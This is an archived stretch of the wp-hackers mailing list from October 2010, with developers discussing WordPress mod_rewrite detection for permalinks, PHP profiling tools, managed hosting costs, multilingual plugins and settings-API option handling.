
Hey everyone.

So last night I killed a kitten when I hacked core. I know, I'm sorry. Now
that I have a minute to solve the problem properly, I wanted to turn to
people smarter than me (you guys) for advice / help. On one of my servers, I
had just installed WordPress 3.0.1 to set up a new site for a client. I went
to go set up Permalinks, and I was met with a blank page. Being a new
install, there aren't any plugins for me to disable, so I turned to google
(like ya do) for answers.

I found this thread:
http://wordpress.org/support/topic/blank-permalink-admin-page-after-changing-permalink-type

And tried the whole deleting / changing the permalink setting from inside
the wp database to no avail. But, at the (almost) end of the thread, *zeniph
*posts some code for hacking core that solves the problem. Understanding
that this is TERRIBLE, I was out of time and did it on the offchance that it
would work - lo and behold, I have access to the Permalinks page again.

So since the code forces mod_rewrite to be detected, clearly the problem
lies with either my build of Apache and reporting mod_rewrite, or with
wordpress detecting mod_rewrite wrong. Has anyone else experienced this
issue, or have any insight? Is this maybe a bug relating to a specific
version of apache / php?

FWIW, I'm running Apache 2.2.16 and PHP 5.3.3 and yes, mod_rewrite is
installed.

Thanks so much!

-Louie

From wp at andrewnacin.com  Sat Oct 16 14:10:12 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sat, 16 Oct 2010 10:10:12 -0400
Subject: [wp-hackers] Apache/mod_rewrite and Permalinks
In-Reply-To: <AANLkTimhEzrFnoapoNXKOWdKyVvo5Un-uFm5ZoO4uFP_@mail.gmail.com>
References: <AANLkTimhEzrFnoapoNXKOWdKyVvo5Un-uFm5ZoO4uFP_@mail.gmail.com>
Message-ID: <AANLkTikbQsa4teNFn+TGDLbZFTKw1LEq00TN5rmn8x=T@mail.gmail.com>

On Sat, Oct 16, 2010 at 9:19 AM, Louis McCoy <louie at louiemccoy.com> wrote:

> Hey everyone.
>
> So last night I killed a kitten when I hacked core. I know, I'm sorry. Now
> that I have a minute to solve the problem properly, I wanted to turn to
> people smarter than me (you guys) for advice / help. On one of my servers,
> I
> had just installed WordPress 3.0.1 to set up a new site for a client. I
> went
> to go set up Permalinks, and I was met with a blank page. Being a new
> install, there aren't any plugins for me to disable, so I turned to google
> (like ya do) for answers.
>
> I found this thread:
>
> http://wordpress.org/support/topic/blank-permalink-admin-page-after-changing-permalink-type
>
> And tried the whole deleting / changing the permalink setting from inside
> the wp database to no avail. But, at the (almost) end of the thread,
> *zeniph
> *posts some code for hacking core that solves the problem. Understanding
> that this is TERRIBLE, I was out of time and did it on the offchance that
> it
> would work - lo and behold, I have access to the Permalinks page again.
>
> So since the code forces mod_rewrite to be detected, clearly the problem
> lies with either my build of Apache and reporting mod_rewrite, or with
> wordpress detecting mod_rewrite wrong. Has anyone else experienced this
> issue, or have any insight? Is this maybe a bug relating to a specific
> version of apache / php?
>
> FWIW, I'm running Apache 2.2.16 and PHP 5.3.3 and yes, mod_rewrite is
> installed.
>
> Thanks so much!


Hi Louie,

Three things:

1. Thank you for your confession. :-)

2. WordPress tries to check for mod_rewrite in two ways: first, whether PHP
believes the module is loaded. Second, it literally looks in phpinfo() to
see if it is loaded. You should run phpinfo() and see whether mod_rewrite is
even listed (or if the function is enabled on your host, as we've seen it
disabled). Something is definitely going really wrong with regards to the
blank page, and I think it's due to phpinfo(8) -- I've seen a similar error
recently. I'm tempted to have us error-suppress that at this point so I'll
look into that.

3. There's a third way. There's a filter in got_mod_rewrite() that you can
use to force it to true. I've posted a plugin in the thread:

<
http://wordpress.org/support/topic/blank-permalink-admin-page-after-changing-permalink-type/page/2?replies=46#post-1742457
>

Thanks,
Nacin

From kikizas at gmail.com  Sat Oct 16 14:20:09 2010
From: kikizas at gmail.com (Demetris Kikizas)
Date: Sat, 16 Oct 2010 17:20:09 +0300
Subject: [wp-hackers] Apache/mod_rewrite and Permalinks
In-Reply-To: <AANLkTikbQsa4teNFn+TGDLbZFTKw1LEq00TN5rmn8x=T@mail.gmail.com>
References: <AANLkTimhEzrFnoapoNXKOWdKyVvo5Un-uFm5ZoO4uFP_@mail.gmail.com>
	<AANLkTikbQsa4teNFn+TGDLbZFTKw1LEq00TN5rmn8x=T@mail.gmail.com>
Message-ID: <AANLkTikxODG_0QDsJoV+bnv=6jsCHuEdN=T+9R6iQBAC@mail.gmail.com>

That hack made me smile, because the filter is defined right there,
just under the hacked line. :-)

Just goes to show that hacking core can be a very strong habit.

NOTE. the __return_true() helper function was introduced in 3.0.  It
does not exist before 3.0.  So, for earlier WP versions one would need
to make a custom function to return true to the filter.

Cheers,

Demetris
http://op111.net/code/wp-xo ? Extra Options, a practical plugin for WordPress

From otto at ottodestruct.com  Sat Oct 16 14:37:29 2010
From: otto at ottodestruct.com (Otto)
Date: Sat, 16 Oct 2010 09:37:29 -0500
Subject: [wp-hackers] Apache/mod_rewrite and Permalinks
In-Reply-To: <AANLkTimhEzrFnoapoNXKOWdKyVvo5Un-uFm5ZoO4uFP_@mail.gmail.com>
References: <AANLkTimhEzrFnoapoNXKOWdKyVvo5Un-uFm5ZoO4uFP_@mail.gmail.com>
Message-ID: <AANLkTimRn4h7chwofQimXfNy=X-rmnTPZ75HDCdwwduf@mail.gmail.com>

Relevant tickets:
http://core.trac.wordpress.org/ticket/11604
http://core.trac.wordpress.org/ticket/11848

-Otto



On Sat, Oct 16, 2010 at 8:19 AM, Louis McCoy <louie at louiemccoy.com> wrote:
> Hey everyone.
>
> So last night I killed a kitten when I hacked core. I know, I'm sorry. Now
> that I have a minute to solve the problem properly, I wanted to turn to
> people smarter than me (you guys) for advice / help. On one of my servers, I
> had just installed WordPress 3.0.1 to set up a new site for a client. I went
> to go set up Permalinks, and I was met with a blank page. Being a new
> install, there aren't any plugins for me to disable, so I turned to google
> (like ya do) for answers.
>
> I found this thread:
> http://wordpress.org/support/topic/blank-permalink-admin-page-after-changing-permalink-type
>
> And tried the whole deleting / changing the permalink setting from inside
> the wp database to no avail. But, at the (almost) end of the thread, *zeniph
> *posts some code for hacking core that solves the problem. Understanding
> that this is TERRIBLE, I was out of time and did it on the offchance that it
> would work - lo and behold, I have access to the Permalinks page again.
>
> So since the code forces mod_rewrite to be detected, clearly the problem
> lies with either my build of Apache and reporting mod_rewrite, or with
> wordpress detecting mod_rewrite wrong. Has anyone else experienced this
> issue, or have any insight? Is this maybe a bug relating to a specific
> version of apache / php?
>
> FWIW, I'm running Apache 2.2.16 and PHP 5.3.3 and yes, mod_rewrite is
> installed.
>
> Thanks so much!
>
> -Louie
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Sat Oct 16 14:41:33 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Sat, 16 Oct 2010 10:41:33 -0400
Subject: [wp-hackers] Apache/mod_rewrite and Permalinks
In-Reply-To: <AANLkTimRn4h7chwofQimXfNy=X-rmnTPZ75HDCdwwduf@mail.gmail.com>
References: <AANLkTimhEzrFnoapoNXKOWdKyVvo5Un-uFm5ZoO4uFP_@mail.gmail.com>
	<AANLkTimRn4h7chwofQimXfNy=X-rmnTPZ75HDCdwwduf@mail.gmail.com>
Message-ID: <AANLkTinJ2MGv0gqyCA1obd3e8qz8gPC8srrhMN76L8RG@mail.gmail.com>

On Sat, Oct 16, 2010 at 10:37 AM, Otto <otto at ottodestruct.com> wrote:

> Relevant tickets:
> http://core.trac.wordpress.org/ticket/11604
> http://core.trac.wordpress.org/ticket/11848
>
> -Otto


And now http://core.trac.wordpress.org/ticket/15038.

From louie at louiemccoy.com  Sat Oct 16 15:39:18 2010
From: louie at louiemccoy.com (Louis McCoy)
Date: Sat, 16 Oct 2010 11:39:18 -0400
Subject: [wp-hackers] Apache/mod_rewrite and Permalinks
In-Reply-To: <AANLkTinJ2MGv0gqyCA1obd3e8qz8gPC8srrhMN76L8RG@mail.gmail.com>
References: <AANLkTimhEzrFnoapoNXKOWdKyVvo5Un-uFm5ZoO4uFP_@mail.gmail.com>
	<AANLkTimRn4h7chwofQimXfNy=X-rmnTPZ75HDCdwwduf@mail.gmail.com>
	<AANLkTinJ2MGv0gqyCA1obd3e8qz8gPC8srrhMN76L8RG@mail.gmail.com>
Message-ID: <AANLkTi=xpsJL3a4k4n3PsmqU+a89pygpOyrAa4UgzsTL@mail.gmail.com>

All you guys are awesome. Learning more about filters every day.


On Sat, Oct 16, 2010 at 10:41 AM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Sat, Oct 16, 2010 at 10:37 AM, Otto <otto at ottodestruct.com> wrote:
>
> > Relevant tickets:
> > http://core.trac.wordpress.org/ticket/11604
> > http://core.trac.wordpress.org/ticket/11848
> >
> > -Otto
>
>
> And now http://core.trac.wordpress.org/ticket/15038.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From andrew at graymerica.com  Sat Oct 16 16:30:13 2010
From: andrew at graymerica.com (Andrew Gray)
Date: Sat, 16 Oct 2010 12:30:13 -0400
Subject: [wp-hackers] Wp Tuner Replacement
Message-ID: <89CDE7AE-28F7-4459-8DE5-D09E807DE1CE@graymerica.com>

What are people using to track time during execution on their wordpress sites.

WP Tuner does not seem to work anymore with 3.0.1  I want to track down plugins and other items that are slowing up my sites.

Any other suggestions would be great,

thanks,

Andrew



From ozh at ozh.org  Sat Oct 16 20:17:54 2010
From: ozh at ozh.org (Ozh)
Date: Sat, 16 Oct 2010 22:17:54 +0200
Subject: [wp-hackers] Wp Tuner Replacement
In-Reply-To: <89CDE7AE-28F7-4459-8DE5-D09E807DE1CE@graymerica.com>
References: <89CDE7AE-28F7-4459-8DE5-D09E807DE1CE@graymerica.com>
Message-ID: <AANLkTinX5k76yYPc-uWGRFj8URurv4=8Ej-Eka=odgmq@mail.gmail.com>

AFAIK the only reliable way to measure this is to use a profiling
tool, for instance XDebug.
I once played a bit with xdebug and blogged about it
<http://planetozh.com/blog/2006/04/profiling-php-scripts-with-xdebug/>
if that's of any help.

On Sat, Oct 16, 2010 at 6:30 PM, Andrew Gray <andrew at graymerica.com> wrote:
> What are people using to track time during execution on their wordpress sites.
>

-- 
http://ozh.org/

From vid at zippykid.com  Sat Oct 16 21:42:01 2010
From: vid at zippykid.com (Vid Luther)
Date: Sat, 16 Oct 2010 14:42:01 -0700
Subject: [wp-hackers] Wp Tuner Replacement
In-Reply-To: <AANLkTinX5k76yYPc-uWGRFj8URurv4=8Ej-Eka=odgmq@mail.gmail.com>
References: <89CDE7AE-28F7-4459-8DE5-D09E807DE1CE@graymerica.com>
	<AANLkTinX5k76yYPc-uWGRFj8URurv4=8Ej-Eka=odgmq@mail.gmail.com>
Message-ID: <8FDE2514-49B5-453A-8B20-84D2668E1E39@zippykid.com>

you can also look into xhprof

http://techportal.ibuildings.com/2009/12/01/profiling-with-xhprof/




On Oct 16, 2010, at 1:17 PM, Ozh wrote:

> AFAIK the only reliable way to measure this is to use a profiling
> tool, for instance XDebug.
> I once played a bit with xdebug and blogged about it
> <http://planetozh.com/blog/2006/04/profiling-php-scripts-with-xdebug/>
> if that's of any help.
> 
> On Sat, Oct 16, 2010 at 6:30 PM, Andrew Gray <andrew at graymerica.com> wrote:
>> What are people using to track time during execution on their wordpress sites.
>> 
> 
> -- 
> http://ozh.org/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

Vid Luther
CEO and Founder
ZippyKid
Managed Wordpress Hosting 
http://zippykid.com/
210-370-7475





From frank at bueltge.de  Sat Oct 16 21:48:31 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Sat, 16 Oct 2010 23:48:31 +0200
Subject: [wp-hackers] Wp Tuner Replacement
In-Reply-To: <8FDE2514-49B5-453A-8B20-84D2668E1E39@zippykid.com>
References: <89CDE7AE-28F7-4459-8DE5-D09E807DE1CE@graymerica.com>
	<AANLkTinX5k76yYPc-uWGRFj8URurv4=8Ej-Eka=odgmq@mail.gmail.com>
	<8FDE2514-49B5-453A-8B20-84D2668E1E39@zippykid.com>
Message-ID: <AANLkTinn0NyYGCGjcHrco5aLQr4ivCBobUXxQJaMWKh8@mail.gmail.com>

I use xDebug and Webgrind vor Profiling in PHP; Webgrind is a webtool, works
with apache and php.
http://code.google.com/p/webgrind/
small informations about this tools and WordPress do you find in my post:
http://wpengineer.com/2011/our-wordpress-developer-toolbox/

You can also use WinCacheGrid with Windows.
http://sourceforge.net/projects/wincachegrind/
Tutorial, only german language (sorry):
http://bueltge.de/php-debugging-und-profiling-leicht-gemacht/520/
Maybe you use a translator.

Best  wishes
Frank



On Sat, Oct 16, 2010 at 11:42 PM, Vid Luther <vid at zippykid.com> wrote:

> you can also look into xhprof
>
> http://techportal.ibuildings.com/2009/12/01/profiling-with-xhprof/
>
>
>
>
> On Oct 16, 2010, at 1:17 PM, Ozh wrote:
>
> > AFAIK the only reliable way to measure this is to use a profiling
> > tool, for instance XDebug.
> > I once played a bit with xdebug and blogged about it
> > <http://planetozh.com/blog/2006/04/profiling-php-scripts-with-xdebug/>
> > if that's of any help.
> >
> > On Sat, Oct 16, 2010 at 6:30 PM, Andrew Gray <andrew at graymerica.com>
> wrote:
> >> What are people using to track time during execution on their wordpress
> sites.
> >>
> >
> > --
> > http://ozh.org/
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> Vid Luther
> CEO and Founder
> ZippyKid
> Managed Wordpress Hosting
> http://zippykid.com/
> 210-370-7475
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Sat Oct 16 23:28:25 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 16 Oct 2010 19:28:25 -0400
Subject: [wp-hackers] Wp Tuner Replacement
In-Reply-To: <AANLkTinn0NyYGCGjcHrco5aLQr4ivCBobUXxQJaMWKh8@mail.gmail.com>
References: <89CDE7AE-28F7-4459-8DE5-D09E807DE1CE@graymerica.com>
	<AANLkTinX5k76yYPc-uWGRFj8URurv4=8Ej-Eka=odgmq@mail.gmail.com>
	<8FDE2514-49B5-453A-8B20-84D2668E1E39@zippykid.com>
	<AANLkTinn0NyYGCGjcHrco5aLQr4ivCBobUXxQJaMWKh8@mail.gmail.com>
Message-ID: <4321CB6B-2D41-48CF-8651-1DB770B29FB6@newclarity.net>

On Oct 16, 2010, at 5:48 PM, Frank Bueltge wrote:
> 
> I use xDebug and Webgrind vor Profiling in PHP; Webgrind is a webtool, works
> with apache and php.
> http://code.google.com/p/webgrind/

Awesome to that.  Thanks for sharing Webgrind!

-Mike


From frank at bueltge.de  Sun Oct 17 09:11:58 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Sun, 17 Oct 2010 11:11:58 +0200
Subject: [wp-hackers] Wp Tuner Replacement
In-Reply-To: <4321CB6B-2D41-48CF-8651-1DB770B29FB6@newclarity.net>
References: <89CDE7AE-28F7-4459-8DE5-D09E807DE1CE@graymerica.com>
	<AANLkTinX5k76yYPc-uWGRFj8URurv4=8Ej-Eka=odgmq@mail.gmail.com>
	<8FDE2514-49B5-453A-8B20-84D2668E1E39@zippykid.com>
	<AANLkTinn0NyYGCGjcHrco5aLQr4ivCBobUXxQJaMWKh8@mail.gmail.com>
	<4321CB6B-2D41-48CF-8651-1DB770B29FB6@newclarity.net>
Message-ID: <AANLkTimgCYoiwkaBxkVf2_nYD8MRSe8GmVCU8=CH6VAy@mail.gmail.com>

Welcome Mike, you share many more as i. But i think, sharing is the great
product Frommermann the application WordPress and without the sharing is
WordPress only an application Frommermann many others.

... von unterwegs, sorry f?r die K?rze der Mail.

Am 17.10.2010 01:28 schrieb "Mike Schinkel" <mikeschinkel at newclarity.net>:

On Oct 16, 2010, at 5:48 PM, Frank Bueltge wrote:
>
> I use xDebug and Webgrind vor Profiling in PH...
Awesome to that.  Thanks for sharing Webgrind!

-Mike


_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic...

From andrew at graymerica.com  Sun Oct 17 13:23:45 2010
From: andrew at graymerica.com (Andrew Gray)
Date: Sun, 17 Oct 2010 09:23:45 -0400
Subject: [wp-hackers] hosting cost
Message-ID: <54B7499E-FAEF-4E24-9DC7-85B22B328109@graymerica.com>

I have a client with a wordpress site that gets the following traffic.

1.  6.2-6.4 Million page views per month
2.  Around 3 TB of Transfer per month
3.  Most of the users are logged in, so the static caching options are not that effective. ABout 80% of the traffic is direct to the DB.  We have about 20 plugins, but nothing too crazy.

We are currently on Rackspace Cloud Sites and the bill is getting up there, since they "fixed" their reporting systems.

WIth out knowing much more, How much do you think they should be paying per month for managed hosting?   Not build your own, support your own server setups, but a support desk that you can call 24-7 and someone who updates your LAMP stack, etc.

I would not hold anyone to the amount, I just wanted to know what this group of experts would think was reasonable for 24 Hour managed / supported hosting for something of this size?

I just want to make sure that I am not way off base when I say our current cost is reasonable.  

thanks and sorry if this is off topic, 

Andrew

PS.  Would people be willing to do a survey on this, if we made the results anonymous and public at the end.  That would be very cool.

From mail at scribu.net  Sun Oct 17 14:00:58 2010
From: mail at scribu.net (scribu)
Date: Sun, 17 Oct 2010 17:00:58 +0300
Subject: [wp-hackers] hosting cost
In-Reply-To: <54B7499E-FAEF-4E24-9DC7-85B22B328109@graymerica.com>
References: <54B7499E-FAEF-4E24-9DC7-85B22B328109@graymerica.com>
Message-ID: <AANLkTik_DdJB4BJpbXL1L_CaMj2P2X=XmYui7PSRLRmt@mail.gmail.com>

On Sun, Oct 17, 2010 at 4:23 PM, Andrew Gray <andrew at graymerica.com> wrote:

> I have a client with a wordpress site that gets the following traffic.
>
> 1.  6.2-6.4 Million page views per month
> 2.  Around 3 TB of Transfer per month
> 3.  Most of the users are logged in, so the static caching options are not
> that effective. ABout 80% of the traffic is direct to the DB.  We have about
> 20 plugins, but nothing too crazy.
>
> We are currently on Rackspace Cloud Sites and the bill is getting up there,
> since they "fixed" their reporting systems.
>
> WIth out knowing much more, How much do you think they should be paying per
> month for managed hosting?   Not build your own, support your own server
> setups, but a support desk that you can call 24-7 and someone who updates
> your LAMP stack, etc.
>

I think http://vip.wordpress.com/hosting/ would be just what you need:

Because of the nature of this program it is not open to the public ? it?s
> intended for high-profile publishers and startups that we have a good deal
> of confidence in. You might be a good candidate for VIP hosting if, for
> example, you get more than 1 million page views a month on your blog.
>
> Pricing is based on a flat rate of $500/month per blog (with a one-time
> setup fee of $1,500 per blog) but is flexible depending on your
> circumstances and number of blogs. We also tend to work with VIPs who have
> at least 5 blogs or sites.
>

From vid at zippykid.com  Sun Oct 17 14:12:09 2010
From: vid at zippykid.com (Vid Luther)
Date: Sun, 17 Oct 2010 07:12:09 -0700
Subject: [wp-hackers] hosting cost
In-Reply-To: <54B7499E-FAEF-4E24-9DC7-85B22B328109@graymerica.com>
References: <54B7499E-FAEF-4E24-9DC7-85B22B328109@graymerica.com>
Message-ID: <3C3F2876-3DDD-4CF0-ADE1-A533B64ED35B@zippykid.com>

Andrew,
 The cost here can vary a little bit, the biggest question would be on the data transfer, can a lot of this data be put on a CDN? If so a CDN's cost would be fixed, and can give you a lower bill.

My company, ZippyKid, offers services similar to WordPress' VIP service, I know our costs will be less than what WordPress VIP will be, if possible, I'd like to discuss options with you over the phone?
My direct cell is 210-789-0369. 

I'm flying back from Las Vegas today (Blogworld), so if I don't answer, it's probably because I'm on a plane.

PS: Don't worry this is not a sales pitch, I'm just curious to learn more, and discuss pricing options with you. I'm a former Rackspace employee, and our systems use Rackspace Cloud Server's instead of Cloud Sites.


On Oct 17, 2010, at 6:23 AM, Andrew Gray wrote:

> I have a client with a wordpress site that gets the following traffic.
> 
> 1.  6.2-6.4 Million page views per month
> 2.  Around 3 TB of Transfer per month
> 3.  Most of the users are logged in, so the static caching options are not that effective. ABout 80% of the traffic is direct to the DB.  We have about 20 plugins, but nothing too crazy.
> 
> We are currently on Rackspace Cloud Sites and the bill is getting up there, since they "fixed" their reporting systems.
> 
> WIth out knowing much more, How much do you think they should be paying per month for managed hosting?   Not build your own, support your own server setups, but a support desk that you can call 24-7 and someone who updates your LAMP stack, etc.
> 
> I would not hold anyone to the amount, I just wanted to know what this group of experts would think was reasonable for 24 Hour managed / supported hosting for something of this size?
> 
> I just want to make sure that I am not way off base when I say our current cost is reasonable.  
> 
> thanks and sorry if this is off topic, 
> 
> Andrew
> 
> PS.  Would people be willing to do a survey on this, if we made the results anonymous and public at the end.  That would be very cool.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

Vid Luther
CEO and Founder
ZippyKid
Managed Wordpress Hosting 
http://zippykid.com/
210-370-7475





From wes.club at gmail.com  Sun Oct 17 16:59:22 2010
From: wes.club at gmail.com (wissem riahi)
Date: Sun, 17 Oct 2010 18:59:22 +0200
Subject: [wp-hackers] Multilanguage Website
Message-ID: <AANLkTiksc6fkYEfYqQ2xObd-NKW+DuW9iK2noLK7sfz6@mail.gmail.com>

Hello
i want to have a multilanguage blog i'm using a plugin called *WPML
Multilingual CMS .*the problem is
* *after i translate my post in other languages using this plugin (from
english to french), pages disspear from the navigation menu(when selecting
french language), allthought i did translate all pages in french too.
How can i translate my post without getting my navigation bar not to
disspear . Or is there another way to do the same thing with other plugin .

-- 
http://twitter.com/WicemRiahi

From frank at bueltge.de  Sun Oct 17 18:02:06 2010
From: frank at bueltge.de (Frank Bueltge)
Date: Sun, 17 Oct 2010 20:02:06 +0200
Subject: [wp-hackers] Multilanguage Website
In-Reply-To: <AANLkTiksc6fkYEfYqQ2xObd-NKW+DuW9iK2noLK7sfz6@mail.gmail.com>
References: <AANLkTiksc6fkYEfYqQ2xObd-NKW+DuW9iK2noLK7sfz6@mail.gmail.com>
Message-ID: <AANLkTikdLK+4spGA6chzA6FujDQ=4Bxitwu5cGGP8cOg@mail.gmail.com>

PLease read this thread, maybe this solution is an better way without a
plugin.
http://wordpress.stackexchange.com/questions/1552/best-practices-for-localizing-wordpress-content/1589#1589


On Sun, Oct 17, 2010 at 6:59 PM, wissem riahi <wes.club at gmail.com> wrote:

> Hello
> i want to have a multilanguage blog i'm using a plugin called *WPML
> Multilingual CMS .*the problem is
> * *after i translate my post in other languages using this plugin (from
> english to french), pages disspear from the navigation menu(when selecting
> french language), allthought i did translate all pages in french too.
> How can i translate my post without getting my navigation bar not to
> disspear . Or is there another way to do the same thing with other plugin .
>
> --
> http://twitter.com/WicemRiahi
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From sbressler at gmail.com  Mon Oct 18 16:46:49 2010
From: sbressler at gmail.com (Scott Bressler)
Date: Mon, 18 Oct 2010 09:46:49 -0700
Subject: [wp-hackers] Plugin options being cleared on save
Message-ID: <AANLkTi=hfWNvpT2CMbg5Wd5wTTzY+CPw8xq_W4Pjjiy1@mail.gmail.com>

I'm saving a plugin's options into a serialized array. On plugin activation,
I insert a version number into the array, which properly appears when I
check the database. However, when I save the options that I added to the
"Writing" screen (using add_settings_section, add_settings_field, and
register_setting), which let the user change the other two settings in the
serialized array, the version number is removed from the array.

Any idea why the version number is kicked out of the array on first save?

Thanks!

-Scott

From johnbillion+wp at gmail.com  Mon Oct 18 17:10:37 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 18 Oct 2010 18:10:37 +0100
Subject: [wp-hackers] Plugin options being cleared on save
In-Reply-To: <AANLkTi=hfWNvpT2CMbg5Wd5wTTzY+CPw8xq_W4Pjjiy1@mail.gmail.com>
References: <AANLkTi=hfWNvpT2CMbg5Wd5wTTzY+CPw8xq_W4Pjjiy1@mail.gmail.com>
Message-ID: <AANLkTinisMWCQvpH=sKm96DeDGtLmL-T-qwEb01X_-E4@mail.gmail.com>

Are you including the version number as a hidden field on the settings
screen so it gets saved with the other options? The entire contents of
the options field gets overwritten using the data that's submitted
(ie. it doesn't just update the array keys that are submitted).

John

On Mon, Oct 18, 2010 at 5:46 PM, Scott Bressler <sbressler at gmail.com> wrote:
> I'm saving a plugin's options into a serialized array. On plugin activation,
> I insert a version number into the array, which properly appears when I
> check the database. However, when I save the options that I added to the
> "Writing" screen (using add_settings_section, add_settings_field, and
> register_setting), which let the user change the other two settings in the
> serialized array, the version number is removed from the array.
>
> Any idea why the version number is kicked out of the array on first save?
>
> Thanks!
>
> -Scott
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From sbressler at gmail.com  Mon Oct 18 17:13:50 2010
From: sbressler at gmail.com (Scott Bressler)
Date: Mon, 18 Oct 2010 10:13:50 -0700
Subject: [wp-hackers] Plugin options being cleared on save
In-Reply-To: <AANLkTinisMWCQvpH=sKm96DeDGtLmL-T-qwEb01X_-E4@mail.gmail.com>
References: <AANLkTi=hfWNvpT2CMbg5Wd5wTTzY+CPw8xq_W4Pjjiy1@mail.gmail.com>
	<AANLkTinisMWCQvpH=sKm96DeDGtLmL-T-qwEb01X_-E4@mail.gmail.com>
Message-ID: <AANLkTi=gTK2jcDFNeAUfgQyXJ26tr5FE_hbjfzsa0VrD@mail.gmail.com>

Thanks for the reply, John. Nope, I'm not - I was hoping that wasn't
necessary. Nacin also mentioned this - could either include as a hidden
field or re-add in the sanitization callback.

Thanks!

-Scott

On Mon, Oct 18, 2010 at 10:10 AM, John Blackbourn
<johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
> wrote:

> Are you including the version number as a hidden field on the settings
> screen so it gets saved with the other options? The entire contents of
> the options field gets overwritten using the data that's submitted
> (ie. it doesn't just update the array keys that are submitted).
>
> John
>
> On Mon, Oct 18, 2010 at 5:46 PM, Scott Bressler <sbressler at gmail.com>
> wrote:
> > I'm saving a plugin's options into a serialized array. On plugin
> activation,
> > I insert a version number into the array, which properly appears when I
> > check the database. However, when I save the options that I added to the
> > "Writing" screen (using add_settings_section, add_settings_field, and
> > register_setting), which let the user change the other two settings in
> the
> > serialized array, the version number is removed from the array.
> >
> > Any idea why the version number is kicked out of the array on first save?
> >
> > Thanks!
> >
> > -Scott
>  > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From otto at ottodestruct.com  Mon Oct 18 17:53:28 2010
From: otto at ottodestruct.com (Otto)
Date: Mon, 18 Oct 2010 12:53:28 -0500
Subject: [wp-hackers] Plugin options being cleared on save
In-Reply-To: <AANLkTi=gTK2jcDFNeAUfgQyXJ26tr5FE_hbjfzsa0VrD@mail.gmail.com>
References: <AANLkTi=hfWNvpT2CMbg5Wd5wTTzY+CPw8xq_W4Pjjiy1@mail.gmail.com>
	<AANLkTinisMWCQvpH=sKm96DeDGtLmL-T-qwEb01X_-E4@mail.gmail.com>
	<AANLkTi=gTK2jcDFNeAUfgQyXJ26tr5FE_hbjfzsa0VrD@mail.gmail.com>
Message-ID: <AANLkTi=SYFjhE2QL0XzznU=Q_6x7t_e8PTGp9G_y-JZm@mail.gmail.com>

You don't need to include it as a hidden field, just remember that
your callback function has to return the entire array. It's going
straight into the database from there. So make sure you pull any
options you want to preserve out of the DB and put them in the new
array. Might be simplest to just pull out the existing array then
update it with the incoming options instead.

-Otto



On Mon, Oct 18, 2010 at 12:13 PM, Scott Bressler <sbressler at gmail.com> wrote:
> Thanks for the reply, John. Nope, I'm not - I was hoping that wasn't
> necessary. Nacin also mentioned this - could either include as a hidden
> field or re-add in the sanitization callback.
>
> Thanks!
>
> -Scott
>
> On Mon, Oct 18, 2010 at 10:10 AM, John Blackbourn
> <johnbillion+wp at gmail.com<johnbillion%2Bwp at gmail.com>
>> wrote:
>
>> Are you including the version number as a hidden field on the settings
>> screen so it gets saved with the other options? The entire contents of
>> the options field gets overwritten using the data that's submitted
>> (ie. it doesn't just update the array keys that are submitted).
>>
>> John
>>
>> On Mon, Oct 18, 2010 at 5:46 PM, Scott Bressler <sbressler at gmail.com>
>> wrote:
>> > I'm saving a plugin's options into a serialized array. On plugin
>> activation,
>> > I insert a version number into the array, which properly appears when I
>> > check the database. However, when I save the options that I added to the
>> > "Writing" screen (using add_settings_section, add_settings_field, and
>> > register_setting), which let the user change the other two settings in
>> the
>> > serialized array, the version number is removed from the array.
>> >
>> > Any idea why the version number is kicked out of the array on first save?
>> >
>> > Thanks!
>> >
>> > -Scott
>> ?> _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From liste at srpski.biz  Mon Oct 18 17:53:35 2010
From: liste at srpski.biz (=?UTF-8?B?TWlsYW4gRGluacSH?=)
Date: Mon, 18 Oct 2010 19:53:35 +0200
Subject: [wp-hackers] Filter search query before execution
In-Reply-To: <AANLkTik8ufXFhG+UMH+H4xcs=ZjLuupGz+4DhejwbE=A@mail.gmail.com>
References: <AANLkTimqJCyfX2RG-TUhpY68beewX1w=4YjBYqELsS0v@mail.gmail.com>
	<AANLkTi=5qmq3OCbx14ier8ASj-HoZjW0THhvd9G4_g1k@mail.gmail.com>
	<AANLkTikwYs_rwuYnJ_Hs1Zbqdqt4i1ByddMa_HSdX4RD@mail.gmail.com>
